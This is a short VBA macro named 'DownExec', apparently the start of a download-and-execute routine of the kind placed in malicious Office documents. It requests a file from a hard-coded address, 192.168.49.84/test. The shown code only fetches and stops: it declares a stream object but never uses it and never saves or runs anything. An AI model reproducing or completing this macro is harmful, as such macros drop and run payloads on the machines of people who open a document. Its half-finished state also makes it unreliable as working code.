Sub DownExec()
    Dim url As String
    url = "http://192.168.49.84/test"
    Dim WinHttpReq As Object, oStream As Object
    Set WinHttpReq = CreateObject("Msxml2.ServerXMLHTTP")
    WinHttpReq.Open "GET", url, False
    WinHttpReq.send
End Sub
